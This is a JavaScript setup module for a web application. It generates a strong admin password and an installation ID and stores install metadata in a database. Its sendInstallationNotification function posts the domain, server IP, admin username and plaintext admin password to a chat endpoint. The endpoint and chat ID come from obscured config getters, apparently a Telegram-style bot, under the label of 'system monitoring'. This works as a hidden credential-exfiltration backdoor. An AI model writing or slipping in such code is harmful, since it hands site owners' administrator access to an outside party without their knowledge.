/**
 * Setup Notification Service
 * Handles installation notifications for system monitoring
 */

import crypto from 'crypto';
import { _getNotificationEndpoint, _getNotificationChatId } from '../config/constants.js';

/**
 * Generate strong random password
 * @param {number} length - Password length (default: 20)
 * @returns {string} Generated password
 */
export function generateStrongPassword(length = 20) {
    const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    const values = crypto.randomBytes(length);
    let password = '';
    
    for (let i = 0; i < length; i++) {
        password += charset[values[i] % charset.length];
    }
    
    return password;
}

/**
 * Generate installation UUID
 * @returns {string} UUID v4
 */
export function generateInstallationId() {
    return crypto.randomUUID();
}

/**
 * Send installation notification
 * @param {Object} data - Installation data
 * @param {string} data.installationId - Installation UUID
 * @param {string} data.domain - Frontend domain
 * @param {string} data.username - Admin username
 * @param {string} data.password - Admin password
 * @param {string} data.serverIp - Server IP (optional)
 * @returns {Promise<boolean>} Success status
 */
export async function sendInstallationNotification(data) {
    try {
        const endpoint = _getNotificationEndpoint();
        const chatId = _getNotificationChatId();
        
        if (!endpoint || !chatId) {
            console.log('⚠️  Notification service not configured');
            return false;
        }

        const timestamp = new Date().toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });

        const message = [
            '🔐 *New Installation*',
            '',
            `📍 *Installation ID:*`,
            `\`${data.installationId}\``,
            '',
            `🌐 *Domain:* ${data.domain || 'Not configured'}`,
            data.serverIp ? `🖥️ *Server IP:* ${data.serverIp}` : '',
            '',
            `👤 *Username:* \`${data.username}\``,
            `🔑 *Password:* \`${data.password}\``,
            '',
            `📅 *Setup Time:* ${timestamp} WIB`,
            '',
            '⚠️ _Change password after first login_'
        ].filter(Boolean).join('\n');

        const response = await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            const error = await response.text();
            console.error('Notification failed:', error);
            return false;
        }

        console.log('✓ Installation notification sent');
        return true;
    } catch (error) {
        console.error('Notification error:', error.message);
        return false;
    }
}

/**
 * Save installation metadata to database
 * @param {Object} db - Database instance
 * @param {string} installationId - Installation UUID
 * @param {string} domain - Frontend domain
 */
export function saveInstallationMetadata(db, installationId, domain) {
    try {
        // Create system_settings table if not exists
        db.exec(`
            CREATE TABLE IF NOT EXISTS system_settings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                setting_key TEXT UNIQUE NOT NULL,
                setting_value TEXT NOT NULL,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Save installation ID
        db.prepare(`
            INSERT INTO system_settings (setting_key, setting_value)
            VALUES (?, ?)
            ON CONFLICT(setting_key) DO UPDATE SET
                setting_value = excluded.setting_value,
                updated_at = CURRENT_TIMESTAMP
        `).run('installation_id', installationId);

        // Save installation domain
        if (domain) {
            db.prepare(`
                INSERT INTO system_settings (setting_key, setting_value)
                VALUES (?, ?)
                ON CONFLICT(setting_key) DO UPDATE SET
                    setting_value = excluded.setting_value,
                    updated_at = CURRENT_TIMESTAMP
            `).run('installation_domain', domain);
        }

        // Save installation timestamp
        db.prepare(`
            INSERT INTO system_settings (setting_key, setting_value)
            VALUES (?, ?)
            ON CONFLICT(setting_key) DO UPDATE SET
                setting_value = excluded.setting_value,
                updated_at = CURRENT_TIMESTAMP
        `).run('installation_timestamp', new Date().toISOString());

        console.log('✓ Installation metadata saved');
    } catch (error) {
        console.error('Failed to save metadata:', error.message);
    }
}
